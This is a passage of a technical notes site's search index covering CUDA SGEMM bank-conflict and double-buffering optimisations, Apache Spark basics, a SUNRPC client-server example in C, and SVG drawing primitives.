\u200b\u5dee\u4e00\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5730\u5740\u200b\u5dee\u200b\u7b49\u4e8e\u200b <code>8(BLOCK_SIZE_PER_THREAD) * 4(sizeof(float)) = 32</code>\uff0c\u200b\u5c0f\u4e8e\u200b 128 \u200b\u5b57\u8282\u200b\u3002\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\u4e86\u200b <code>blockDim.x=16, blockDim.y=16</code> \u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u4e00\u4e2a\u200b warp \u200b\u5185\u200b\u7684\u200b <code>threadIdx</code> \u200b\u60c5\u51b5\u200b\uff1a</p> <pre><code>warp thread 0: threadIdx.x=0, threadIdx.y=0\n// ...\nwarp thread 15: threadIdx.x=15, threadIdx.y=0\nwarp thread 16: threadIdx.x=0, threadIdx.y=1\n// ...\nwarp thread 31: threadIdx.x=15, threadIdx.y=1\n</code></pre> <p>\u200b\u56e0\u6b64\u200b\u8bfb\u53d6\u200b aTile \u200b\u4f1a\u200b\u51fa\u73b0\u200b\u5927\u91cf\u200b\u7684\u200b Bank Conflict\uff0c\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u90fd\u200b\u8bfb\u53d6\u200b\u540c\u4e00\u4e2a\u200b Shared Memory Bank\u3002\u200b\u6240\u4ee5\u200b\u89e3\u51b3\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u628a\u200b threadIdx.x \u200b\u53d8\u5316\u200b\u65f6\u200b\u7684\u200b\u5730\u5740\u200b\u5dee\u200b\u53d8\u6210\u200b\u4e0d\u662f\u200b 128 \u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u907f\u514d\u200b Bank Conflict\u3002\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u4ea4\u6362\u200b aTile \u200b\u7684\u200b\u884c\u548c\u5217\u200b\u7684\u200b\u4fdd\u5b58\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5730\u5740\u200b\u5dee\u200b\u5c31\u200b\u53d8\u6210\u200b\u4e86\u200b <code>8(BLOCK_SIZE_PER_THREAD) * 4(sizeof(float)) = 32</code>\uff0c\u200b\u5927\u5927\u51cf\u5c11\u200b\u4e86\u200b Bank Conflict \u200b\u7684\u200b\u60c5\u51b5\u200b\uff1a</p> <pre><code>// the two dimensions of aTile are swapped to reduce bank conflict\n__shared__ float aTile[SHARED_K_DIMENSION][BLOCK_SIZE_PER_THREAD_BLOCK];\n\n// thread (0, 0), tid=0: aTile[0..=3][0]\n// thread (0, 1), tid=1: aTile[4..=7][0]\n// thread (0, 2), tid=2: aTile[0..=3][1]\n// ...\n// thread (0, 15), tid=15: aTile[4..=7][7]\n// thread (1, 0), tid=16: aTile[0..=3][8]\n// ...\n// thread (15, 15), tid=255: aTile[4..=7][127]\nint block_x = BLOCK_SIZE_PER_THREAD_BLOCK * blockIdx.x;\nint block_y = i;\nint local_x = tid / 2;\nint local_y = 4 * (tid % 2);\nfor (int j = 0; j &lt; 4; j++) {\n    // swap aTile dimensions to reduce bank conflict\n    aTile[local_y + j][local_x] =\n        a[IDX2C(block_x + local_x, block_y + local_y + j, k)];\n}\n\n// ...\n// swap aTile dimensions to reduce bank conflict\nsum[xx][yy] +=\n    aTile[ii - i][threadIdx.x * BLOCK_SIZE_PER_THREAD + xx] *\n    bTile[ii - i][threadIdx.y * BLOCK_SIZE_PER_THREAD + yy];\n</code></pre> <p>\u200b\u4e0d\u8fc7\u200b Bank Conflict \u200b\u4f9d\u7136\u200b\u662f\u200b\u5b58\u5728\u200b\u7684\u200b\uff1a\u200b\u5bf9\u4e8e\u200b threadIdx.x=0 \u200b\u548c\u200b threadIdx.x=4 \u200b\u7684\u200b\u4e24\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u5b83\u4eec\u200b\u7684\u200b\u5730\u5740\u200b\u5dee\u662f\u200b <code>4 * 8(BLOCK_SIZE_PER_THREAD) * 4(sizeof(float)) = 128</code>\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b Bank Conflict\u3002\u200b\u4f46\u200b\u53d1\u751f\u200b Bank Conflict \u200b\u7684\u200b\u60c5\u51b5\u200b\u964d\u4f4e\u200b\u5230\u200b\u4e86\u200b\u56db\u5206\u4e4b\u4e00\u200b\u3002\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u8c03\u6574\u200b x \u200b\u548c\u200b y \u200b\u7684\u200b\u6bd4\u4f8b\u200b\uff0c\u200b\u8fdb\u4e00\u6b65\u200b\u51cf\u5c11\u200b Bank Conflict\uff0c\u200b\u4f7f\u5f97\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u6253\u6ee1\u200b Shared memory \u200b\u5e26\u5bbd\u200b\u3002</p> <p>\u200b\u8fd9\u6837\u200b\u5199\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u9644\u5e26\u200b\u7684\u200b\u597d\u5904\u200b\uff1a\u200b\u7531\u4e8e\u200b xx \u200b\u548c\u200b yy \u200b\u90fd\u200b\u5728\u200b\u5185\u5c42\u200b\u5faa\u73af\u200b\uff0cii \u200b\u662f\u200b\u5916\u5c42\u200b\u5faa\u73af\u200b\uff0c\u200b\u628a\u200b\u5185\u5b58\u200b\u5faa\u73af\u200b\u7684\u200b\u5faa\u73af\u200b\u53d8\u91cf\u200b\u53c2\u4e0e\u200b\u5230\u200b\u6700\u540e\u200b\u4e00\u7ef4\u200b\u7684\u200b\u4e0b\u6807\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6539\u5584\u200b\u5185\u5b58\u200b\u5c40\u90e8\u6027\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e5f\u200b\u65b9\u4fbf\u200b NVCC \u200b\u53bb\u200b\u4f18\u5316\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4f7f\u7528\u200b LDS.128 \u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u4ece\u200b shared memory \u200b\u8bfb\u53d6\u200b 128 \u200b\u4f4d\u200b\u7684\u200b\u8fde\u7eed\u200b\u6570\u636e\u200b\u3002</p>"},{"location":"software/sgemm_cuda.html#sgemm-v5","title":"SGEMM v5","text":"<p>v5 \u200b\u76f8\u6bd4\u200b v4 \u200b\u7684\u200b\u6539\u8fdb\u200b\u5728\u4e8e\u200b Double Buffering\uff1a\u200b\u73b0\u5728\u200b\u7684\u200b\u6d41\u7a0b\u200b\u662f\u200b\u6bcf\u8f6e\u200b\u5148\u200b\u8bfb\u53d6\u6570\u636e\u200b\u5230\u200b shared memory\uff0c\u200b\u518d\u200b\u4ece\u200b shared memory \u200b\u4e2d\u200b\u8bfb\u53d6\u6570\u636e\u200b\u6765\u200b\u8ba1\u7b97\u200b\u3002\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\u8bbf\u5b58\u200b\u5355\u5143\u200b\u662f\u200b\u7a7a\u95f2\u200b\u7684\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u8bbf\u5b58\u200b\u5355\u5143\u200b\u53bb\u200b\u8bfb\u53d6\u200b\u4e0b\u200b\u4e00\u8f6e\u200b\u7684\u200b shared memory \u200b\u6240\u8981\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u4e3a\u4e86\u200b\u51cf\u5c11\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\uff0c\u200b\u628a\u200b Buffer \u200b\u7a7a\u95f4\u200b\u590d\u5236\u200b\u4e24\u4efd\u200b\uff0c\u200b\u4e00\u4efd\u200b\u7528\u6765\u200b\u7ed9\u200b\u5f53\u524d\u200b\u8f6e\u200b\u505a\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u540c\u65f6\u200b\u53bb\u200b\u8bfb\u53d6\u6570\u636e\u200b\u5230\u200b\u53e6\u200b\u4e00\u4efd\u200b\uff0c\u200b\u518d\u200b\u628a\u200b\u4e24\u4efd\u200b\u4ea4\u6362\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b Double Buffering\u3002</p> <p>\u200b\u9996\u5148\u200b\u662f\u200b\u5728\u200b Shared Memory \u200b\u4e0a\u200b\u5206\u914d\u200b\u4e24\u500d\u200b\u7684\u200b Buffer \u200b\u7a7a\u95f4\u200b\uff1a</p> <pre><code>// double buffering\n__shared__ float aTile[2][SHARED_K_DIMENSION][BLOCK_SIZE_PER_THREAD_BLOCK];\n__shared__ float bTile[2][SHARED_K_DIMENSION][BLOCK_SIZE_PER_THREAD_BLOCK];\n</code></pre> <p>\u200b\u63a5\u7740\u200b\u601d\u8003\u200b\uff1a\u200b\u6bcf\u200b\u4e00\u8f6e\u200b\u5faa\u73af\u200b\u9700\u8981\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff0c\u200b\u5305\u62ec\u200b\u8ba1\u7b97\u200b\u5f53\u524d\u200b\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u8bfb\u53d6\u200b\u4e0b\u200b\u4e00\u8f6e\u200b\u7684\u200b shared memory\uff0c\u200b\u90a3\u4e48\u200b\u591a\u6b21\u200b\u5faa\u73af\u200b\u7684\u200b\u6548\u679c\u200b\u662f\u200b\uff1a</p> <ol> <li>\u200b\u8ba1\u7b97\u200b\u7b2c\u4e00\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8bfb\u53d6\u200b\u7b2c\u4e8c\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u8ba1\u7b97\u200b\u7b2c\u4e8c\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8bfb\u53d6\u200b\u7b2c\u4e09\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u7b49\u7b49\u200b</li> <li>\u200b\u8ba1\u7b97\u200b\u5012\u6570\u200b\u7b2c\u4e8c\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8bfb\u53d6\u200b\u6700\u540e\u200b\u4e00\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u8fd9\u65f6\u5019\u200b\u4f60\u200b\u4f1a\u200b\u53d1\u73b0\u200b\uff1a\u200b\u7f3a\u5c11\u200b\u4e86\u200b\u8bfb\u53d6\u200b\u7b2c\u4e00\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b\u8ba1\u7b97\u200b\u6700\u540e\u200b\u4e00\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u6b65\u9aa4\u200b\u653e\u5728\u200b\u5faa\u73af\u200b\u5916\u200b\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b\uff1a</p> <ol> <li>\u200b\u8bfb\u53d6\u200b\u7b2c\u4e00\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u5728\u200b K \u200b\u7ef4\u5ea6\u200b\u4e0a\u200b\u5faa\u73af\u200b\uff1a\u200b\u8ba1\u7b97\u200b\u7b2c\u200b i \u200b\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8bfb\u53d6\u200b\u7b2c\u200b i+1 \u200b\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u8ba1\u7b97\u200b\u6700\u540e\u200b\u4e00\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u540c\u65f6\u200b\u7528\u200b <code>buffer_index</code> \u200b\u7ef4\u62a4\u200b\u5f53\u524d\u200b\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b\u5728\u200b Double Buffer \u200b\u7684\u200b\u54ea\u200b\u4e00\u4e2a\u200b Buffer \u200b\u4e0a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8981\u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7528\u200b <code>buffer_index</code> \u200b\u4f5c\u4e3a\u200b\u4e0b\u6807\u200b\uff0c\u200b\u8868\u793a\u200b\u8fd9\u200b\u4e00\u8f6e\u200b\u5728\u200b\u7528\u200b\u7684\u200b Buffer\uff1b\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u7528\u200b <code>buffer_index ^ 1</code> \u200b\u4f5c\u4e3a\u200b\u4e0b\u6807\u200b\uff0c\u200b\u8868\u793a\u200b\u4e0b\u200b\u4e00\u8f6e\u200b\u8981\u200b\u7528\u5230\u200b\u7684\u200b Buffer\uff1b\u200b\u4e00\u8f6e\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u4ea4\u6362\u200b\u4e24\u4e2a\u200b Buffer\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b <code>buffer_index ^= 1</code>\u3002</p> <p>\u200b\u8bfb\u53d6\u200b\u7b2c\u4e00\u8f6e\u200b\u6570\u636e\u200b\u5230\u200b Shared Memory\uff1a</p> <pre><code>int buffer_index = 0;\n// ...\naTile[buffer_index][local_y + j][local_x] =\n    a[IDX2C(block_x + local_x, block_y + local_y + j, k)];\n// ...\nbTile[buffer_index][local_x][local_y + j] =\n        b[IDX2C(block_x + local_x, block_y + local_y + j, n)];\n</code></pre> <p>\u200b\u5faa\u73af\u200b\u4e2d\u200b\uff0c\u200b\u8bfb\u53d6\u200b\u4e0b\u200b\u4e00\u8f6e\u200b\u7684\u200b\u6570\u636e\u200b\u5230\u200b Shared Memory\uff1a</p> <pre><code>// ...\naTile[buffer_index ^ 1][local_y + j][local_x] =\n    a[IDX2C(block_x + local_x, block_y + local_y + j, k)];\n// ...\nbTile[buffer_index ^ 1][local_x][local_y + j] =\n    b[IDX2C(block_x + local_x, block_y + local_y + j, n)];\n</code></pre> <p>\u200b\u8ba1\u7b97\u200b\u65f6\u200b\uff0c\u200b\u7528\u200b\u5f53\u524d\u200b\u8f6e\u200b\u7684\u200b Buffer\uff1a</p> <pre><code>sum[xx][yy] += aTile[buffer_index][ii - real_i]\n                    [threadIdx.x * BLOCK_SIZE_PER_THREAD + xx] *\n                bTile[buffer_index][ii - real_i]\n                    [threadIdx.y * BLOCK_SIZE_PER_THREAD + yy];\n</code></pre> <p>\u200b\u4e00\u8f6e\u200b\u7ed3\u675f\u200b\u540e\u200b\uff0c\u200b\u66f4\u65b0\u200b <code>buffer_index</code>\uff1a</p> <pre><code>buffer_index ^= 1;\n</code></pre> <p>\u200b\u6700\u540e\u200b\u4e00\u8f6e\u200b\u8ba1\u7b97\u200b\u4e5f\u200b\u662f\u200b\u7528\u200b <code>buffer_index</code> \u200b\u505a\u200b\u4e0b\u6807\u200b\uff0c\u200b\u548c\u200b\u4e0a\u9762\u200b\u4e00\u6837\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u91cd\u590d\u200b\u4e86\u200b\u3002</p>"},{"location":"software/spark.html","title":"Apache Spark","text":""},{"location":"software/spark.html#installation","title":"Installation","text":"<p>Follow https://spark.apache.org/downloads.html, download and extract</p>"},{"location":"software/spark.html#usage","title":"Usage","text":"<ul> <li>REPL: pyspark(Python), spark-shell(Scala)</li> <li>Job submission: <code>spark-submit code.py/code.jar</code></li> <li>Run example: <code>run-example SparkPi</code>, <code>spark-submit examples/src/main/python/pi.py</code></li> </ul>"},{"location":"software/spark.html#initialize","title":"Initialize","text":"<p>Create SparkSession to use SQL interface: https://spark.apache.org/docs/latest/sql-programming-guide.html</p> <pre><code>SparkSession.builder.appName(\"SimpleApp\").getOrCreate()\n</code></pre> <p>Old RDD interface uses SparkContext: https://spark.apache.org/docs/latest/rdd-programming-guide.html</p>"},{"location":"software/spark.html#read-data","title":"Read data","text":"<p>Get Dataset/DataFrame from files:</p> <ul> <li>spark.read.load(path): infer file type</li> <li>spark.read.text(path)</li> <li>spark.read.json(path)</li> </ul> <p>Or run SQL on files directly:</p> <pre><code>val sqlDF = spark.sql(\"SELECT * FROM parquet.`examples/src/main/resources/users.parquet`\")\n</code></pre> <p>See more on https://spark.apache.org/docs/latest/sql-data-sources.html</p>"},{"location":"software/spark.html#store-data","title":"Store data","text":"<p>Save Dataset/DataFrame to files:</p> <ul> <li>df.write.save(path)</li> </ul>"},{"location":"software/spark.html#dataset","title":"Dataset","text":"<p>Supports functional programming, the functions transforms Dataset in to a new one.</p> <p>Actions: extract values from Dataset</p> <ul> <li>count()</li> <li>first()</li> <li>collect()</li> </ul> <p>Supports caching in memory: cache()</p> <p>Execute raw SQL queries: <code>spark.sql(query)</code>, https://spark.apache.org/docs/latest/api/sql/</p> <p>Register a Dataset as a temporary view in SQL: <code>df.createOrReplaceTempView(name)</code></p>"},{"location":"software/sunrpc.html","title":"SUNRPC \u200b\u4f8b\u5b50","text":"<p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4f7f\u7528\u200b SUNRPC \u200b\u5b9e\u73b0\u200b\u5b57\u7b26\u4e32\u200b\u5c0f\u5199\u200b\u8f6c\u200b\u5927\u5199\u200b\u670d\u52a1\u200b\u7684\u200b\u4f8b\u5b50\u200b\u3002</p> <p>\u200b\u7b2c\u4e00\u6b65\u200b\uff1a\u200b\u7f16\u5199\u200b RPC \u200b\u63a5\u53e3\u200b\uff1a</p> <pre><code>$ cat test.x\nprogram TEST_PROG {\n    version TEST_VERS {\n        string TEST(string) = 1;\n    } = 1;\n} = 0x12345678;\n$ rpcgen test.x\n# generates test_clnt.c/test_svc.c/test.h\n</code></pre> <p>\u200b\u7b2c\u4e8c\u6b65\u200b\uff1a\u200b\u7f16\u5199\u200b\u670d\u52a1\u7aef\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5b83\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\u662f\u200b\u628a\u200b\u8f93\u5165\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b\u8f6c\u200b\u5927\u5199\u200b\uff1a</p> <pre><code>$ cat server.c\n#include \"test.h\"\n#include &lt;ctype.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nchar **test_1_svc(char **input, struct svc_req *req) {\n    static char *result;\n    char *str = *input;\n\n    result = malloc(strlen(str) + 1);\n    if (!result) return NULL;\n\n    for (int i = 0; str[i]; i++)\n        result[i] = toupper((unsigned char)str[i]);\n    result[strlen(str)] = '\\0';\n\n    return &amp;result;\n}\n$ gcc server.c test_svc.c -o test_svc -I/usr/include/tirpc -ltirpc\n</code></pre> <p>\u200b\u7b2c\u4e09\u6b65\u200b\uff1a\u200b\u7f16\u5199\u200b\u5ba2\u6237\u7aef\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u901a\u8fc7\u200b RPC \u200b\u8c03\u7528\u200b\u670d\u52a1\u7aef\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>#include \"test.h\"\n#include &lt;stdio.h&gt;\n\nint main(int argc, char *argv[]) {\n    CLIENT *clnt;\n    char *server = \"localhost\";\n    char *input = \"hello rpc\";\n    char **result;\n\n    clnt = clnt_create(server, TEST_PROG, TEST_VERS, \"tcp\");\n    if (!clnt) {\n        clnt_pcreateerror(server);\n        return 1;\n    }\n\n    result = test_1(&amp;input, clnt);\n    if (!result) {\n        clnt_perror(clnt, \"call failed\");\n        return 1;\n    }\n\n    printf(\"Original: %s\\n\", input);\n    printf(\"Result  : %s\\n\", *result);\n\n    clnt_freeres(clnt, (xdrproc_t)xdr_wrapstring, (char*)result);\n    clnt_destroy(clnt);\n    return 0;\n}\n$ gcc client.c test_clnt.c -o test_clnt -I/usr/include/tirpc -ltirpc\n</code></pre> <p>\u200b\u6700\u540e\u200b\uff0c\u200b\u8fd0\u884c\u200b\u670d\u52a1\u7aef\u200b\u548c\u200b\u5ba2\u6237\u7aef\u200b\uff0c\u200b\u5f97\u5230\u200b\u7ed3\u679c\u200b\uff1a</p> <pre><code>$ ./test_svc &amp;\n$ ./test_clnt\nOriginal: hello rpc\nResult  : HELLO RPC\n$ rpcinfo\n   program version netid     address                service    owner\n 305419896    1    udp       0.0.0.0.197.117        -          1001\n 305419896    1    tcp       0.0.0.0.211.156        -          1001\n$ lsof -c test_svc\nCOMMAND     PID   USER   FD   TYPE    DEVICE SIZE/OFF     NODE NAME\ntest_svc 825692 jiegec    3u  IPv4 248857870      0t0      UDP *:50549\ntest_svc 825692 jiegec    4u  IPv4 248857872      0t0      TCP *:54172 (LISTEN)\n</code></pre> <p>\u200b\u5176\u4e2d\u200b 305419896 \u200b\u5c31\u662f\u200b 0x12345678\uff0c50549 \u200b\u662f\u200b <code>197*256+117</code>\uff0c54172 \u200b\u662f\u200b <code>211*256+156</code>\u3002</p> <p>Credit: \u200b\u672c\u6587\u200b\u7531\u200b DeepSeek \u200b\u8f85\u52a9\u200b\u7f16\u5199\u200b\u3002</p>"},{"location":"software/svg.html","title":"SVG","text":""},{"location":"software/svg.html#_1","title":"\u5750\u6807\u8f74","text":"<p>SVG \u200b\u5de6\u4e0a\u89d2\u200b\u662f\u200b\u5750\u6807\u200b (0, 0)\uff0cx \u200b\u8f74\u6b63\u200b\u65b9\u5411\u5411\u200b\u53f3\u200b\uff0cy \u200b\u8f74\u6b63\u200b\u65b9\u5411\u200b\u5411\u4e0b\u200b\uff1a</p> <pre><code>(0, 0) ---------&gt; x\n  |\n  |\n  |\n  |\n  V\n  y\n</code></pre> <p>\u200b\u5bbd\u5ea6\u200b\u662f\u200b x \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u957f\u5ea6\u200b\uff0c\u200b\u9ad8\u5ea6\u200b\u662f\u200b y \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u957f\u5ea6\u200b\u3002</p>"},{"location":"software/svg.html#line","title":"line","text":"<p>Line\uff1a\u200b\u4ece\u200b (x1, y1) \u200b\u5230\u200b (x2,y2) \u200b\u8fde\u200b\u4e00\u6761\u200b\u76f4\u7ebf\u200b\uff1a</p> <pre><code>&lt;line x1=\"0\" y1=\"100\" x2=\"100\" y2=\"0\" stroke=\"black\" /&gt;\n&lt;line x1=\"0\" y1=\"0\" x2=\"100\" y2=\"100\" stroke=\"blue\" stroke-width=\"10\" /&gt;\n</code></pre> <p> </p> <p>\u200b\u7528\u200b\u591a\u6761\u200b line \u200b\u7ed8\u5236\u200b\u4e00\u4e2a\u200b\u6b63\u65b9\u5f62\u200b\uff1a</p> <pre><code>&lt;line x1=\"0\" y1=\"0\" x2=\"100\" y2=\"0\" stroke=\"black\" /&gt;\n&lt;line x1=\"100\" y1=\"0\" x2=\"100\" y2=\"100\" stroke=\"black\" /&gt;\n&lt;line x1=\"100\" y1=\"100\" x2=\"0\" y2=\"100\" stroke=\"black\" /&gt;\n&lt;line x1=\"0\" y1=\"100\" x2=\"0\" y2=\"0\" stroke=\"black\" /&gt;\n</code></pre> <p> </p>"},{"location":"software/svg.html#rect","title":"rect","text":"<p>Rect\uff1a\u200b\u4ee5\u200b (x,y) \u200b\u4e3a\u200b\u5de6\u4e0a\u89d2\u200b\uff0c\u200b\u7ed8\u5236\u200b\u4e00\u4e2a\u200b width x height \u200b\u7684\u200b\u77e9\u5f62\u200b\uff1a</p> <pre><code>&lt;line x1=\"0\" y1=\"0\" x2=\"100\" y2=\"0\" stroke=\"black\" /&gt;\n&lt;line x1=\"0\" y1=\"0\" x2=\"0\" y2=\"100\" stroke=\"black\" /&gt;\n&lt;rect x=\"10\" y=\"10\" width=\"80\" height=\"80\" fill=\"red\" /&gt;\n</code></pre> <p> </p>"},{"location":"software/svg.html#text","title":"text","text":"<p>Text\uff1a\u200b\u9ed8\u8ba4\u200b\u4ee5\u200b (x,y) \u200b\u4e3a\u200b\u5de6\u4e0b\u89d2\u200b\uff0c\u200b\u7ed8\u5236\u200b\u4e00\u6bb5\u200b\u6587\u5b57\u200b</p> <pre><code>&lt;rect x=\"10\" y=\"10\" width=\"100\" height=\"30\" fill=\"red\" /&gt;\n&lt;text x=\"20\" y=\"30\"&gt;Hello, World!&lt;/text&gt;\n&lt;circle cx=\"20\" cy=\"30\" r=\"2\" fill=\"blue\" /&gt;\n</code></pre> <p> Hello, World! </p> <p>\u200b\u51fa\u73b0\u200b\u5728\u200b\u540e\u9762\u200b\u7684\u200b text \u200b\u4f1a\u200b\u53e0\u52a0\u200b\u5728\u200b\u51fa\u73b0\u200b\u5728\u200b\u524d\u9762\u200b\u7684\u200b rect \u200b\u4e0a\u200b\u3002</p>"},{"location":"software/svg.html#text-anchor","title":"text-anchor","text":"<p>\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u5b9e\u73b0\u200b\u5728\u200b x \u200b\u65b9\u5411\u200b\u4e0a\u200b\u5c45\u4e2d\u200b\u7ed8\u5236\u200b\u6587\u5b57\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>text-anchor=\"middle\"</code>\uff0c\u200b\u6b64\u65f6\u200b\u5b9a\u4f4d\u200b\u7684\u200b\u662f\u200b\u6b63\u4e0b\u65b9\u200b\u7684\u200b\u5750\u6807\u200b\uff1a</p> <pre><code>&lt;rect x=\"10\" y=\"10\" width=\"110\" height=\"30\" fill=\"red\" /&gt;\n&lt;text x=\"65\" y=\"30\" text-anchor=\"middle\"&gt;Hello, World!&lt;/text&gt;\n&lt;circle cx=\"65\" cy=\"30\" r=\"2\" fill=\"blue\" /&gt;\n</code></pre> <p> Hello, World! </p> <p>\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\u4e0d\u540c\u200b <code>text-anchor</code> \u200b\u8bbe\u7f6e\u200b\u7684\u200b\u5bf9\u6bd4\u200b\uff1a</p> <pre><code>&lt;rect x=\"10\" y=\"10\" width=\"180\" height=\"90\" fill=\"red\" /&gt;\n&lt;text x=\"100\" y=\"30\" text-anchor=\"start\"&gt;start&lt;/text&gt;\n&lt;circle cx=\"100\" cy=\"30\" r=\"2\" fill=\"blue\" /&gt;\n&lt;text x=\"100\" y=\"60\" text-anchor=\"middle\"&gt;middle&lt;/text&gt;\n&lt;circle cx=\"100\" cy=\"60\" r=\"2\" fill=\"blue\" /&gt;\n&lt;text x=\"100\" y=\"90\" text-anchor=\"end\"&gt;end&lt;/text&gt;\n&lt;circle cx=\"100\" cy=\"90\" r=\"2\" fill=\"blue\" /&gt;\n</code></pre> <p> start middle end </p>"},{"location":"software/svg.html#dominant-baseline","title":"dominant-baseline","text":"<p>\u200b\u5982\u679c\u200b\u8981\u200b\u5728\u200b x \u200b\u65b9\u5411\u200b\u548c\u200b y \u200b\u65b9\u5411\u200b\u4e0a\u200b\u90fd\u200b\u5c45\u4e2d\u200b\u7ed8\u5236\u200b\u6587\u5b57\u200b\uff0c\u200b\u8981\u200b\u5728\u200b <code>text-anchor=\"middle\"</code> \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u8bbe\u7f6e\u200b <code>dominant-baseline=\"middle\"</code>\uff0c\u200b\u6b64\u65f6\u200b\u5b9a\u4f4d\u70b9\u200b\u5c31\u662f\u200b\u6587\u672c\u200b\u7684\u200b\u4e2d\u592e\u200b\uff1a</p> <pre><code>&lt;rect x=\"10\" y=\"10\" width=\"110\" height=\"30\" fill=\"red\" /&gt;\n&lt;text x=\"65\" y=\"25\" text-anchor=\"middle\" dominant-baseline=\"middle\"&gt;Hello, World!&lt;/text&gt;\n&lt;circle cx=\"65\" cy=\"25\" r=\"2\" fill=\"blue\" /&gt;\n</code></pre> <p> Hello, World! </p> <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u7ed3\u5408\u200b <code>text-anchor</code> \u200b\u548c\u200b <code>dominant-baseline</code>\uff0c\u200b\u53ef\u4ee5\u200b\u5b9a\u4f4d\u200b\u6587\u672c\u200b\u7684\u200b\u4e0d\u540c\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u5404\u79cd\u200b\u5bf9\u9f50\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\u4e0d\u540c\u200b <code>dominant-baseline</code> \u200b\u8bbe\u7f6e\u200b\u7684\u200b\u5bf9\u6bd4\u200b\uff1a</p> <pre><code>&lt;rect x=\"10\" y=\"10\" width=\"180\" height=\"280\" fill=\"red\" /&gt;\n&lt;text x=\"20\" y=\"30\" dominant-baseline=\"text-bottom\"&gt;text-bottom abc123&lt;/text&gt;\n&lt;line x1=\"20\" y1=\"30\" x2=\"160\" y2=\"30\" stroke=\"blue\" stroke-width=\"1\" /&gt;\n&lt;text x=\"20\" y=\"60\" dominant-baseline=\"alphabetic\"&gt;alphabetic abc123&lt;/text&gt;\n&lt;line x1=\"20\" y1=\"60\" x2=\"160\" y2=\"60\" stroke=\"blue\" stroke-width=\"1\" /&gt;\n&lt;text x=\"20\" y=\"90\" dominant-baseline=\"ideographic\"&gt;ideographic abc123&lt;/text&gt;\n&lt;line x1=\"20\" y1=\"90\" x2=\"160\" y2=\"90\" stroke=\"blue\" stroke-width=\"1\" /&gt;\n&lt;text 